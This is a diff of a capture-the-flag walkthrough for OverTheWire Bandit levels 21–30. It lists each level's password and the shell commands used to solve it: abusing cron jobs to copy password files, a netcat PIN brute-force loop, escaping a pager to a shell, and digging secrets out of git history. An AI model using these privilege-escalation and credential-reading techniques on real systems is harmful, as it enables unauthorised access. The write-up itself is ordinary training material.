@@ -166,31 +166,104 @@ echo 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 25002 &
 ssh bandit21@bandit.labs.overthewire.org -p 2220  
 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr  
 ```
-
+cd /etc/cron.d/
+ls
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ```
 ## level22
 ssh bandit22@bandit.labs.overthewire.org -p 2220  
-
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI  
+```
+cd /etc/cron.d/
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+file=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+cat /tmp/$file
+```
 ## level23
 ssh bandit23@bandit.labs.overthewire.org -p 2220  
-
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n  
+```
+cd /etc/cron.d/
+ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24/pass' > cat_pass.sh; chmod 777 cat_pass.sh
+# wait a minute...
+cat /tmp/bandit24/pass
+```
 ## level24
 ssh bandit24@bandit.labs.overthewire.org -p 2220  
-
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
+```
+cd /tmp/bandit24
+echo '#!/bin/bash' > brute_pin.sh
+echo 'for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"; done | nc 127.0.0.1 30002' >> brute_pin.sh
+chmod 777 brute_pin.sh
+./brute_pin.sh | grep pass 
+```
 ## level25
 ssh bandit25@bandit.labs.overthewire.org -p 2220  
-
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG  
+```
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
+```
+**Change terminal to 5 lines**  
+```
+v
+e: /etc/bandit_pass/bandit26
+```
 ## level26
+**Change terminal to 5 lines** 
 ssh bandit26@bandit.labs.overthewire.org -p 2220  
-
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z  
+```
+v
+:set shell=/bin/bash
+:shell
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
 ## level27
 ssh bandit27@bandit.labs.overthewire.org -p 2220  
-
+3ba3118a22e93127a4ed485be72ef5ea  
+```
+mkdir /tmp/bandit27/tmp27; cd $_
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+yes
+3ba3118a22e93127a4ed485be72ef5ea
+cat /repo/README
+```
 ## level28
 ssh bandit28@bandit.labs.overthewire.org -p 2220  
-
+0ef186ac70e04ea33b4c1853d2526fa2  
+```
+mkdir /tmp/bandit28/tmp28; cd $_
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+yes
+0ef186ac70e04ea33b4c1853d2526fa2
+git log
+git reset --hard 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+cat README.md
+```
 ## level29
 ssh bandit29@bandit.labs.overthewire.org -p 2220  
-
+bbc96594b4e001778eee9975372716b2  
+```
+mkdir /tmp/bandit29/tmp29; cd $_
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+yes
+bbc96594b4e001778eee9975372716b2
+git branch -a
+git checkout remotes/origin/dev
+cat README.md
+```
 ## level30
-ssh bandit30@bandit.labs.overthewire.org -p 2220  
+ssh bandit30@bandit.labs.overthewire.org -p 2220 
+5b90576bedb2cc04c86a9e924ce42faf  
+```
+
+``` 
